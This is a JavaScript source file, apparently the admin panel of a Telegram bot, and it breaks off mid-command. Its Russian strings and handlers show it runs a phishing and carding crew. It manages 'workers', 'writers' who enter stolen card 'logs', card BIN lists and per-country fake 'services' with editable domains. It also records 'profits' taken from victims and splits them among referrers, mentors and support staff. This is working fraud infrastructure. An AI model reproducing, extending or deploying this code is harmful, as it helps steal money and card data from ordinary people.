const { Composer, Markup } = require("telegraf");
const admin = require("../commands/admin/admin");
const ads = require("../commands/admin/ads");
const bins = require("../commands/admin/bins");
const countries = require("../commands/admin/countries");
const profits = require("../commands/admin/profits");
const requests = require("../commands/admin/requests");
const services = require("../commands/admin/services");
const settings = require("../commands/admin/settings");
const user = require("../commands/admin/user");
const ad = require("../commands/admin/ad");
const userAds = require("../commands/admin/userAds");
const userProfits = require("../commands/admin/userProfits");
const users = require("../commands/admin/users");
const writers = require("../commands/admin/writers");
const { Settings, User, Ad, Service, Profit, Country, Writer, Request, Bin, Log, ProfitRequest, Currency } = require("../database");
const locale = require("../locale");
const chunk = require("chunk");
const profit = require("../commands/admin/profit");
const addWriterSelectCountry = require("../commands/admin/addWriterSelectCountry");
const writer = require("../commands/admin/writer");
const request = require("../commands/admin/request");
const bin = require("../commands/admin/bin");
const country = require("../commands/admin/country");
const service = require("../commands/admin/service");
const { Op } = require("sequelize");
const log = require("../helpers/log");
const help = require("../commands/admin/help");
const mentorAnket = require("../commands/mentorAnket");
const profitRequest = require("../commands/admin/profitRequest");
const adminBot = new Composer();

adminBot.command("admin", admin);
adminBot.action("admin", admin);

adminBot.command("settings", settings);
adminBot.action("admin_settings", settings);

adminBot.command("calcPer", async (ctx) => {
  try {
    const usersOnPer = await User.findAll({
      where: {
        percent: {
          [Op.not]: null,
          [Op.gt]: 0,
        },
        percentType: {
          [Op.not]: null,
        },
      },
    });

    var profits = await Profit.sum("convertedAmount", {
      where: {
        status: 0,
      },
    });

    var text = `НЕВЫПЛАЧЕННЫЙ ПРОЦЕНТ ПЕРСОНАЛА:\n`;

    await Promise.allSettled(
      usersOnPer.map(async (v) => {
        try {
          var profits_ = profits;
          if (v.percentType == 2)
            profits_ = await Profit.sum("convertedAmount", {
              where: {
                status: 0,
                writerId: v.id,
              },
            });
          text += `\n <b><a href="tg://user?id=${v.id}">${v.username}</a> — ${((profits_ / 100) * parseFloat(v.percent)).toFixed(
            2
          )} RUB (${v.percent}%${v.percentType == 1 ? " со всех залетов" : " со вбитых логов"})</b>`;
        } catch (err) {}
      })
    );
    return ctx
      .reply(text, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_turn_(on|off)_((requests|allLogs|allHelloMsg)Enabled)$/, async (ctx) => {
  try {
    await ctx.state.bot.update({
      [ctx.match[2]]: ctx.match[1] == "on",
    });

    return settings(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_edit_(allGroupLink|payoutsChannelLink|payoutPercent|paypal|iban)$/, (ctx) =>
  ctx.scene.enter("admin_edit_value", {
    column: ctx.match[1],
  })
);

adminBot.action(/^admin_answer_complaint_(\d+)$/, (ctx) =>
  ctx.scene.enter("admin_answer_complaint", {
    id: ctx.match[1],
  })
);

adminBot.command("all", (ctx) => ctx.scene.enter("admin_send_mail"));
adminBot.action("admin_send_mail", (ctx) => ctx.scene.enter("admin_send_mail"));

adminBot.command("users", (ctx) => users(ctx));

adminBot.hears(/^\/user @?([A-Za-z0-9_]+)$/, (ctx) => user(ctx, ctx.match[1]));
adminBot.hears(/^\/ad (\d+)$/, (ctx) => ad(ctx, ctx.match[1]));
adminBot.hears(/^\/profit (\d+)$/, (ctx) => profit(ctx, ctx.match[1]));

adminBot.command("vbiv", (ctx) => writers(ctx));

adminBot.action("admin_add_writer", addWriterSelectCountry);
adminBot.action("admin_add_bin", (ctx) => ctx.scene.enter("admin_add_bin"));

adminBot.action(/^admin_country_([A-Za-z0-9_]+)_(show|hide)$/, async (ctx) => {
  try {
    const country_ = await Country.findByPk(ctx.match[1]);

    await country_.update({
      status: ctx.match[2] == "show" ? 1 : 0,
    });

    await ctx
      .answerCbQuery(
        `✅ Вы успешно ${
          ctx.match[2] == "show" ? "включили отображение страны и её сервисов" : "выключили отображение страны и её сервисов"
        }`,
        true
      )
      .catch((err) => err);
    log(ctx, `${country_.status == 1 ? "включил отображение страны" : "скрыл страну"} ${country_.title}`);
    return country(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_country_([A-Za-z0-9_]+)$/, (ctx) => country(ctx, ctx.match[1]));

adminBot.action(/^admin_service_([A-Za-z0-9_]+)_edit_domain$/, (ctx) =>
  ctx.scene.enter("admin_service_edit_domain", {
    id: ctx.match[1],
  })
);

adminBot.action(/^admin_service_([A-Za-z0-9_]+)_edit_domain_pro$/, (ctx) =>
  ctx.scene.enter("admin_service_edit_domain_pro", {
    id: ctx.match[1],
  })
);
adminBot.action(/^admin_service_([A-Za-z0-9_]+)_(show|hide)$/, async (ctx) => {
  try {
    const service_ = await Service.findByPk(ctx.match[1]);

    await service_.update({
      status: ctx.match[2] == "show" ? 1 : 0,
    });

    await ctx
      .answerCbQuery(
        `✅ Вы успешно ${ctx.match[2] == "show" ? "включили отображение сервиса" : "выключили отображение сервиса"}`,
        true
      )
      .catch((err) => err);
    log(ctx, `${service_.status == 1 ? "включил отображение сервиса" : "скрыл сервис"} ${service_.title}`);
    return service(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_service_([A-Za-z0-9_]+)$/, (ctx) => service(ctx, ctx.match[1]));
adminBot.action(/^admin_bin_(\d+)$/, (ctx) => bin(ctx, ctx.match[1]));

adminBot.action(/^admin_bin_(\d+)_delete$/, async (ctx) => {
  try {
    const bin = await Bin.findByPk(ctx.match[1]);
    await bin.destroy();

    await ctx.answerCbQuery("✅ БИН удалён!", true).catch((err) => err);
    log(ctx, `удалил БИН <b>${bin.bin}</b>`);
    return bins(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.hears(/^\/bin (\d+)$/, async (ctx) => {
  try {
    const bin_ = await Bin.findOne({
      where: {
        bin: ctx.match[1],
      },
    });
    if (!bin_) return ctx.reply("❌ БИН не найден").catch((err) => err);
    return bin(ctx, bin_.id);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_add_writer_([A-Za-z0-9_]+)$/, (ctx) =>
  ctx.scene.enter("admin_add_writer", {
    countryCode: ctx.match[1],
  })
);

adminBot.action(/^admin_user_(\d+)_request_(\d+)$/, (ctx) => request(ctx, ctx.match[2], ctx.match[1]));

adminBot.action(/^admin_user_(\d+)_request_(\d+)_(accept|decline)$/, async (ctx) => {
  try {
    const request_ = await Request.findByPk(ctx.match[1], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!request_) return ctx.answerCbQuery("❌ Заявка не найдена", true).catch((err) => err);
    await request_.update({
      status: ctx.match[3] == "accept" ? 1 : 2,
    });
    await ctx.telegram
      .sendMessage(request_.userId, locale.requests[request_.status == 1 ? "accepted" : "declined"], {
        parse_mode: "HTML",
        reply_markup:
          request_.status == 1
            ? Markup.inlineKeyboard([
                [
                  Markup.urlButton("👥 Чат", ctx.state.bot.allGroupLink),
                  Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink),
                ],
                [Markup.callbackButton(locale.go_to_menu, "start")],
              ])
            : {},
      })
      .catch((err) => err);

    await ctx
      .answerCbQuery(request_.status == 1 ? "✅ Вы успешно приняли заявку!" : "✅ Вы успешно отклонили заявку!", true)
      .catch((err) => err);
    log(
      ctx,
      `${request_.status == 1 ? "принял" : "отклонил"} заявку #${request_.id} пользователя <b><a href="tg://user?id=${
        request_.userId
      }">${request_.user.username}</a></b>`
    );
    return request(ctx, ctx.match[2], ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_request_(\d+)_(accept|decline)$/, async (ctx) => {
  try {
    const request_ = await Request.findByPk(ctx.match[1], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!request_) return ctx.answerCbQuery("❌ Заявка не найдена", true).catch((err) => err);

    await request_.update({
      status: ctx.match[2] == "accept" ? 1 : 2,
    });
    await ctx.telegram
      .sendMessage(request_.userId, locale.requests[request_.status == 1 ? "accepted" : "declined"], {
        parse_mode: "HTML",
        reply_markup:
          request_.status == 1
            ? Markup.inlineKeyboard([
                [
                  Markup.urlButton("👥 Чат", ctx.state.bot.allGroupLink),
                  Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink),
                ],
                [Markup.callbackButton(locale.go_to_menu, "start")],
              ])
            : {},
      })
      .catch((err) => err);
    await ctx
      .answerCbQuery(request_.status == 1 ? "✅ Вы успешно приняли заявку!" : "✅ Вы успешно отклонили заявку!", true)
      .catch((err) => err);
    log(
      ctx,
      `${request_.status == 1 ? "принял" : "отклонил"} заявку #${request_.id} пользователя <b><a href="tg://user?id=${
        request_.userId
      }">${request_.user.username}</a></b>`
    );
    return request(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

// 
adminBot.action(/^admin_profitrequest_(\d+)_(accept|decline)$/, async (ctx) => {
  try {
    const request_ = await ProfitRequest.findByPk(ctx.match[1], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!request_) return ctx.answerCbQuery("❌ Заявка не найдена", true).catch((err) => err);

    var amount = parseFloat(request_.amount);
    amount = amount.toFixed(2);

    var userWorker = request_.user;
    var userReferral;
    var amountReferral;
    var userMentor;
    var amountMentor;
    var userSupport;
    var amountSupport;

    if (userWorker.referral) {
      userReferral = await User.findByPk(userWorker.referral);

      amountReferral = parseFloat((amount / 100) * 1).toFixed(2);
      amount -= amountReferral;
    }

    if (userWorker.myMentor) {
      userMentor = await User.findByPk(userWorker.myMentor);

      amountMentor = parseFloat((amount / 100) * 5).toFixed(2);
      amount -= amountMentor;
    }

    if (userWorker.mySupport) {
      userSupport = await User.findByPk(userWorker.mySupport);

      amountSupport = parseFloat((amount / 100) * 4).toFixed(2);
      amount -= amountSupport;
    }

    const currency = await Currency.findOne({
      where: {
        code: request_.currency,
      },
    });

    var convertedAmount = (
      parseFloat(amount) * parseFloat(currency.rub)
    ).toFixed(2);

    let userProfitsSum = parseInt(
      await Profit.sum("convertedAmount", {
        where: { userId: userWorker.id },
      })
    );
    if (!userProfitsSum) userProfitsSum = 0;
    if (userWorker.status === 0 && (+convertedAmount + +userProfitsSum) >= 250000) {
      await userWorker.update({
        status: 3,
      });
    }

    const profit = await Profit.create({
      userId: request_.user.id,
      amount,
      convertedAmount,
      currency: String(currency.code).toUpperCase(),
      serviceTitle: request_.serviceTitle,
      writerId: ctx.from.id,
    });
    const profitUser = await profit.getUser(),
      profitWriter = await profit.getWriter();
    var text = locale.newProfit.channel;

    var profitReferral;
    if (userWorker.referral) {
      const convertedAmountReferral = (parseFloat(amountReferral) * parseFloat(currency.rub)).toFixed(2)
      profitReferral = await Profit.create({
        userId: userReferral.id,
        amount: amountReferral,
        convertedAmount: convertedAmountReferral,
        currency: String(currency.code).toUpperCase(),
        serviceTitle: "👥 Рефералка",
        writerId: ctx.from.id,
      });
    }

    var profitMentor;
    if (userWorker.myMentor) {
      const convertedAmountMentor = (parseFloat(amountMentor) * parseFloat(currency.rub)).toFixed(2)
      profitMentor = await Profit.create({
        userId: userMentor.id,
        amount: amountMentor,
        convertedAmount: convertedAmountMentor,
        currency: String(currency.code).toUpperCase(),
        serviceTitle: "👨‍🎓 Наставник",
        writerId: ctx.from.id,
      });
    }

    var profitSupport;
    if (userWorker.mySupport) {
      const convertedAmountSupport = (parseFloat(amountSupport) * parseFloat(currency.rub)).toFixed(2)
      profitSupport = await Profit.create({
        userId: userSupport.id,
        amount: amountSupport,
        convertedAmount: convertedAmountSupport,
        currency: String(currency.code).toUpperCase(),
        serviceTitle: "👨‍💻 Тех. поддержка",
        writerId: ctx.from.id,
      });
    }

    var workerAmount = (
        (parseFloat(profit.amount) / 100) *
        parseFloat(ctx.state.bot.payoutPercent)
      ).toFixed(2),
      workerConvertedAmount = (
        parseFloat(workerAmount) * parseFloat(currency.rub)
      ).toFixed(2);

    text = text
      .replace("{serviceTitle}", ctx.scene.state.serviceTitle)
      .replace(
        "{amount}",
        `${profit.amount} ${profit.currency} | ${profit.convertedAmount} RUB`
      )
      .replace(
        `{workerAmount}`,
        `${workerAmount} ${profit.currency} | ${workerConvertedAmount} RUB`
      )
      .replace(
        "{worker}",
        profitUser.hideNick
          ? "Скрыт"
          : `<a href="tg://user?id=${profit.userId}">${profitUser.username}</a>`
      )
      .replace(
        "{writer}",
        `<a href="tg://user?id=${profitWriter.id}">${profitWriter.username}</a>`
      )
      .replace("{profitId}", profit.id);
    const msg = await ctx.telegram
      .sendMessage(ctx.state.bot.payoutsChannelId, text, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(locale.newProfit.wait, "none")],
        ]),
      })
      .catch((err) => err);
    await profit.update({
      channelMessageId: msg.message_id,
    });

    if (profitReferral) {
      const textReferral = locale.newProfit.channelReferal
        .replace("{profitId}", profitReferral.id)
        .replace(
          "{amount}",
          `${profitReferral.amount} ${profitReferral.currency} | ${profitReferral.convertedAmount} RUB`
        )
        .replace(
          "{worker}",
          userReferral.hideNick
            ? "Скрыт"
            : `<a href="tg://user?id=${profitReferral.userId}">${userReferral.username}</a>`
        )
      const msgReferral = await ctx.telegram.sendMessage(ctx.state.bot.payoutsChannelId, textReferral, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(locale.newProfit.wait, "none")],
        ]),
      });
      await profitReferral.update({
        channelMessageId: msgReferral.message_id,
      });
      await ctx.telegram.sendMessage(
        userReferral.id,
        locale.newProfit.referral
          .replace("{profitId}", profitReferral.id)
          .replace(
            "{amount}",
            `${profitReferral.amount} ${profitReferral.currency} | ${profitReferral.convertedAmount} RUB`
          ),
        {
          parse_mode: "HTML",
        }
      );
    }

    if (profitMentor) {
      const textMentor = locale.newProfit.channelMentor
        .replace("{profitId}", profitMentor.id)
        .replace(
          "{amount}",
          `${profitMentor.amount} ${profitMentor.currency} | ${profitMentor.convertedAmount} RUB`
        )
        .replace(
          "{worker}",
          userMentor.hideNick
            ? "Скрыт"
            : `<a href="tg://user?id=${profitMentor.userId}">${userMentor.username}</a>`
        )
      const msgMentor = await ctx.telegram.sendMessage(ctx.state.bot.payoutsChannelId, textMentor, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(locale.newProfit.wait, "none")],
        ]),
      });
      await profitMentor.update({
        channelMessageId: msgMentor.message_id,
      });
      await ctx.telegram.sendMessage(
        userMentor.id,
        locale.newProfit.mentor
          .replace("{profitId}", profitMentor.id)
          .replace(
            "{amount}",
            `${profitMentor.amount} ${profitMentor.currency} | ${profitMentor.convertedAmount} RUB`
          ),
        {
          parse_mode: "HTML",
        }
      );
    }

    if (profitSupport) {
      const textSupport = locale.newProfit.channelSupport
        .replace("{profitId}", profitSupport.id)
        .replace(
          "{amount}",
          `${profitSupport.amount} ${profitSupport.currency} | ${profitSupport.convertedAmount} RUB`
        )
        .replace(
          "{worker}",
          userSupport.hideNick
            ? "Скрыт"
            : `<a href="tg://user?id=${profitSupport.userId}">${userSupport.username}</a>`
        )
      const msgSupport = await ctx.telegram.sendMessage(ctx.state.bot.payoutsChannelId, textSupport, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(locale.newProfit.wait, "none")],
        ]),
      });
      await profitSupport.update({
        channelMessageId: msgSupport.message_id,
      });
      await ctx.telegram.sendMessage(
        userSupport.id,
        locale.newProfit.support
          .replace("{profitId}", profitSupport.id)
          .replace(
            "{amount}",
            `${profitSupport.amount} ${profitSupport.currency} | ${profitSupport.convertedAmount} RUB`
          ),
        {
          parse_mode: "HTML",
        }
      );
    }

    await ctx.telegram
      .sendMessage(
        profitUser.id,
        locale.newProfit.worker
          .replace("{profitId}", profit.id)
          .replace(
            "{amount}",
            `${profit.amount} ${profit.currency} / ${profit.convertedAmount} RUB`
          )
          .replace(
            `{workerAmount}`,
            `${workerAmount} ${profit.currency} / ${workerConvertedAmount} RUB`
          )
          .replace(
            "{writer}",
            `<a href="tg://user?id=${profitWriter.id}">${profitWriter.username}</a>`
          ),
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
    log(
      ctx,
      `добавил новый профит #${profit.id} суммой ${profit.amount} ${profit.currency} для пользователя <b><a href="tg://user?id=${profitUser.id}">${profitUser.username}</a></b>`
    );



















    await request_.update({
      status: ctx.match[2] == "accept" ? 1 : 2,
    });
    await ctx.telegram
      .sendMessage(request_.userId, `✅ <b>Ваша заявка на добавление профита была принята администратором</b>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
    await ctx
      .answerCbQuery(request_.status == 1 ? "✅ Вы успешно приняли заявку!" : "✅ Вы успешно отклонили заявку!", true)
      .catch((err) => err);
    log(
      ctx,
      `${request_.status == 1 ? "принял" : "отклонил"} заявку на добавление профита #${request_.id} от пользователя <b><a href="tg://user?id=${
        request_.userId
      }">${request_.user.username}</a></b>`
    );
    return profitRequest(ctx, ctx.match[1]);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
// 

adminBot.action(/^admin_request_(\d+)$/, (ctx) => request(ctx, ctx.match[1]));
adminBot.action(/^admin_writer_(\d+)$/, (ctx) => writer(ctx, ctx.match[1]));
adminBot.action(/^admin_writer_(\d+)_delete$/, async (ctx) => {
  try {
    await Writer.destroy({
      where: {
        id: ctx.match[1],
      },
    });
    await ctx.answerCbQuery("✅ Вбивер убран из списка!", true).catch((err) => err);

    return writers(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_users_(\d+)$/, (ctx) => users(ctx, ctx.match[1]));
adminBot.action(/^admin_user_(\d+)$/, (ctx) => user(ctx, ctx.match[1]));
adminBot.action(/^admin_user_(\d+)_profit_(\d+)_delete$/, async (ctx) => {
  try {
    const profit = await Profit.findByPk(ctx.match[2]);
    if (!profit) return ctx.answerCbQuery("❌ Профит не найден", true);

    await profit.destroy();
    await ctx.telegram.deleteMessage(ctx.state.bot.payoutsChannelId, profit.channelMessageId).catch((err) => err);
    await ctx.answerCbQuery("✅ Профит удален", true).catch((err) => err);

    log(ctx, `удалил профит #${profit.id} суммой ${profit.amount} ${profit.currency}`);
    return userProfits(ctx, ctx.match[1], 1);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_profit_(\d+)_delete$/, async (ctx) => {
  try {
    const profit = await Profit.findByPk(ctx.match[1]);
    if (!profit) return ctx.answerCbQuery("❌ Профит не найден", true);
    await profit.destroy();
    await ctx.telegram.deleteMessage(ctx.state.bot.payoutsChannelId, profit.channelMessageId).catch((err) => err);
    await ctx.answerCbQuery("✅ Профит удален", true).catch((err) => err);
    log(ctx, `удалил профит #${profit.id} суммой ${profit.amount} ${profit.currency}`);
    return profits(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_user_(\d+)_profit_(\d+)_set_status_(wait|payed|razvitie)$/, async (ctx) => {
  try {
    const profit_ = await Profit.findByPk(ctx.match[2]);
    await profit_.update({
      status: {
        wait: 0,
        payed: 1,
        razvitie: 2,
      }[ctx.match[3]],
    });
    await ctx.telegram
      .editMessageReplyMarkup(
        ctx.state.bot.payoutsChannelId,
        profit_.channelMessageId,
        profit_.channelMessageId,
        Markup.inlineKeyboard([[Markup.callbackButton(locale.newProfit[ctx.match[3]], "none")]])
      )
      .catch((err) => err);

    await ctx.answerCbQuery("✅ Статус профита изменен", true).catch((err) => err);
    return profit(ctx, profit_.id, profit_.userId);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_profit_(\d+)_set_status_(wait|payed|razvitie)$/, async (ctx) => {
  try {
    const profit_ = await Profit.findByPk(ctx.match[1]);
    await profit_.update({
      status: {
        wait: 0,
        payed: 1,
        razvitie: 2,
      }[ctx.match[2]],
    });
    await ctx.telegram
      .editMessageReplyMarkup(
        ctx.state.bot.payoutsChannelId,
        profit_.channelMessageId,
        profit_.channelMessageId,
        Markup.inlineKeyboard([[Markup.callbackButton(locale.newProfit[ctx.match[2]], "none")]])
      )
      .catch((err) => err);

    await ctx.answerCbQuery("✅ Статус профита изменен", true).catch((err) => err);
    return profit(ctx, profit_.id);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_user_(\d+)_add_profit$/, async (ctx) => {
  try {
    const services = await Service.findAll({
      order: [["countryCode", "asc"]],
      include: [
        {
          association: "currency",
          required: true,
        },
      ],
    });

    return ctx
      .replyOrEdit("Выберите сервис", {
        reply_markup: Markup.inlineKeyboard([
          ...(services.length >= 1
            ? chunk(services.map((v) => Markup.callbackButton(v.title, `admin_user_${ctx.match[1]}_add_profit_${v.code}`)))
            : [[Markup.callbackButton("Страница пуста", "none")]]),
          [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_user_(\d+)_add_profit_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    const service = await Service.findOne({
      where: {
        code: ctx.match[2],
      },
      include: [
        {
          association: "currency",
          required: true,
        },
      ],
    });
    const user = await User.findByPk(ctx.match[1]);
    if (!service) {
      await ctx.answerCbQuery("❌ Сервис не найден", true).catch((err) => err);
      return user(ctx, ctx.match[1]);
    }
    if (!user) {
      await ctx.answerCbQuery("❌ Пользователь не найден", true).catch((err) => err);
      return users(ctx);
    }

    return ctx.scene.enter("admin_add_profit", {
      userId: user.id,
      serviceTitle: service.title,
      currency: service.currency.code,
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_user_(\d+)_ads_(\d+)$/, (ctx) => userAds(ctx, ctx.match[1], ctx.match[2]));
adminBot.action(/^admin_user_(\d+)_ad_(\d+)$/, (ctx) => ad(ctx, ctx.match[2], ctx.match[1]));
adminBot.action(/^admin_user_(\d+)_profits_(\d+)$/, (ctx) => userProfits(ctx, ctx.match[1], ctx.match[2]));
adminBot.action(/^admin_user_(\d+)_profit_(\d+)$/, (ctx) => profit(ctx, ctx.match[2], ctx.match[1]));
adminBot.action(/^admin_profit_(\d+)$/, (ctx) => profit(ctx, ctx.match[1]));

adminBot.action(/^admin_user_(\d+)_set_status_(admin|writer|worker|pro)$/, async (ctx) => {
  try {
    const user_ = await User.findByPk(ctx.match[1]);
    await user_.update({
      status: {
        admin: 1,
        writer: 2,
        pro: 3,
        worker: 0,
      }[ctx.match[2]],
    });

    log(
      ctx,
      `изменил статус пользователя <b><a href="tg://user?id=${user_.id}">${user_.username}</a></b> на ${
        locale.roles[ctx.match[2]]
      }`
    );
    await ctx.answerCbQuery("✅ Вы успешно изменили статус пользователя!", true).catch((err) => err);
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_user_(\d+)_((un)?ban)$/, async (ctx) => {
  try {
    if (ctx.match[2] == "ban" && ctx.from.id == ctx.match[1])
      return ctx.answerCbQuery("❌ Вы не можете заблокировать сами себя", true).catch((err) => err);
    const user_ = await User.findByPk(ctx.match[1]);

    await user_.update({
      banned: ctx.match[2] == "ban",
    });

    if (ctx.match[2] == "ban")
      ctx.telegram
        .sendMessage(ctx.match[1], locale.your_account_banned, {
          parse_mode: "HTML",
        })
        .catch((err) => err);

    log(
      ctx,
      `${user_.banned ? "заблокировал" : "разблокировал"} пользователя <b><a href="tg://user?id=${user_.id}">${
        user_.username
      }</a></b>`
    );
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_user_(\d+)_edit_status$/, (ctx) => {
  if (ctx.from.id == ctx.match[1]) return ctx.answerCbQuery("❌ Вы не можете изменить свой статус", true).catch((err) => err);
  ctx
    .replyOrEdit(`Выберите статус`, {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton(locale.roles.admin, `admin_user_${ctx.match[1]}_set_status_admin`)],
        [Markup.callbackButton(locale.roles.pro, `admin_user_${ctx.match[1]}_set_status_pro`)],
        [Markup.callbackButton(locale.roles.writer, `admin_user_${ctx.match[1]}_set_status_writer`)],
        [Markup.callbackButton(locale.roles.worker, `admin_user_${ctx.match[1]}_set_status_worker`)],
        [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}`)],
      ]),
    })
    .catch((err) => err);
});

adminBot.action(/^admin_user_(\d+)_edit_percent_default$/, async (ctx) => {
  try {
    const user_ = await User.findByPk(ctx.match[1]);

    await user_.update({
      percent: null,
      percentType: null,
    });
    log(
      ctx,
      `установил стандартный процент воркера для пользователя <b><a href="tg://user?id=${user_.id}">${user.username}</a></b>`
    );
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_user_(\d+)_edit_percent_(allProfits|logs)$/, (ctx) =>
  ctx.scene.enter("admin_user_edit_percent", {
    userId: ctx.match[1],
    percentType: ctx.match[2],
  })
);

adminBot.action(/^admin_user_(\d+)_select_percent_type$/, (ctx) =>
  ctx
    .replyOrEdit(`💴 Выберите тип процента`, {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("💰 Со всех залетов", `admin_user_${ctx.match[1]}_edit_percent_allProfits`)],
        [Markup.callbackButton("💳 Со вбитых логов", `admin_user_${ctx.match[1]}_edit_percent_logs`)],
        [Markup.callbackButton(`❌ Убрать процент`, `admin_user_${ctx.match[1]}_edit_percent_default`)],
        [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}`)],
      ]),
    })
    .catch((err) => err)
);

adminBot.command("countries", (ctx) => countries(ctx));
adminBot.action(/^admin_countries_(\d+)$/, (ctx) => countries(ctx, ctx.match[1]));
adminBot.command("services", (ctx) => services(ctx));
adminBot.action(/^admin_services_(\d+)$/, (ctx) => services(ctx, ctx.match[1]));
adminBot.command("ads", (ctx) => ads(ctx));
adminBot.action(/^admin_ads_(\d+)$/, (ctx) => ads(ctx, ctx.match[1]));
adminBot.action(/^admin_ad_(\d+)$/, (ctx) => ad(ctx, ctx.match[1]));
adminBot.action(/^admin_ad_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findByPk(ctx.match[1], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad) return ctx.answerCbQuery("❌ Объявление не найдено", true).catch((err) => err);

    await ad.destroy();
    log(ctx, `удалил объявление #${ad.id} пользователя <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>`);
    return ctx.replyOrEdit("✅ Объявление удалено", {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("👤 Перейти к пользователю", `admin_user_${ad.userId}`)],
        [Markup.callbackButton(locale.go_back, `admin_ads_1`)],
      ]),
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_user_(\d+)_ad_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findByPk(ctx.match[2], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad) return ctx.answerCbQuery("❌ Объявление не найдено", true).catch((err) => err);

    await ad.destroy();
    log(ctx, `удалил объявление #${ad.id} пользователя <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>`);
    return ctx.replyOrEdit("✅ Объявление удалено", {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("👤 Перейти к пользователю", `admin_user_${ctx.match[1]}`)],
        [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}_ads_1`)],
      ]),
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("bins", (ctx) => bins(ctx));
adminBot.action(/^admin_bins_(\d+)$/, (ctx) => bins(ctx, ctx.match[1]));
adminBot.command("profits", (ctx) => profits(ctx));
adminBot.action(/^admin_profits_(\d+)$/, (ctx) => profits(ctx, ctx.match[1]));
adminBot.command("requests", (ctx) => requests(ctx));
adminBot.action(/^admin_requests_(\d+)$/, (ctx) => requests(ctx, ctx.match[1]));
adminBot.command("writers", (ctx) => writers(ctx));
adminBot.action(/^admin_writers_(\d+)$/, (ctx) => writers(ctx, ctx.match[1]));

adminBot.command("setrequestsgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      requestsGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для заявок");
    return ctx
      .reply(`<b>✅ Группа для заявок установлена</b> <code>ID: ${ctx.chat.id}</code>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setallgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      allGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу общего чата");
    return ctx
      .reply(`<b>✅ Общий чат установлен</b> <code>ID: ${ctx.chat.id}</code>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("setlogsgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      logsGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для логов");
    return ctx
